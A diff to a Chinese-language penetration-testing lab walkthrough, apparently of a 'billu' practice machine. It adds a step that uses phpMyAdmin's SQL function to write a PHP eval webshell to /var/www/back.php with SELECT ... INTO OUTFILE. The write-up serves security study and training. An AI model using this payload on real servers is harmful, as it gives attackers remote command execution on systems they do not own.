@@ -502,6 +502,9 @@ root
 #### 5.3.1利用phpmyadmin日志获取webshell
 发现登入的用户billu不具有root权限，方法无法使用
 #### 5.3.2利用phpmyadmin执行SQL语句获取webshell
-
+在phpmyadmin处使用SQL语句功能
+```SQL
+select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
+```
 
 
